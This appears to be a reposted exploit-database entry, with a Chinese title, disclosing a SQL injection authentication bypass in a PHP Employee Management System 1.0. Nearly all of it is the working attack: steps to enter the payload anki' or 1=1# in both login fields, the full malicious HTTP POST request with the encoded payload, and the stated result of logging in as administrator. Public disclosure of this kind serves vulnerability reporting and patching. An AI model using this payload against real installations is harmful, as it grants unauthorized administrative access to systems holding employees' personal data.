# 员工管理系统(Employee Management System)1.0 身份验证绕过



```
#Exploit Title: Employee Management System 1.0 - Authentication Bypass
#Date: 2020-10-16
#Exploit Author: Ankita Pal
#Vendor Homepage: https://www.sourcecodester.com/php/14432/employee-management-system-using-php.html
#Software Link: https://www.sourcecodester.com/sites/default/files/download/razormist/employee-management-system.zip
#Version: 1.0
#Tested on: Windows 10 + xampp v3.2.4


Proof of Concept:::

Step 1: Open the URL http://localhost:8081/Employee%20Management%20System/alogin.html

Step 2: Use payload anki' or 1=1# for both username and password.


Malicious Request:::

POST /Employee%20Management%20System/process/aprocess.php HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Origin: http://localhost:8081
Connection: close
Referer: http://localhost:8081/Employee%20Management%20System/alogin.html
Cookie: PHPSESSID=infdfigld4et4jndfgbn33kcsv
Upgrade-Insecure-Requests: 1

mailuid=anki%27+or+1%3D1%23&pwd=anki%27+or+1%3D1%23&login-submit=Login

You will be login as Admin of the application.
```

ref：

https://www.exploit-db.com/exploits/48882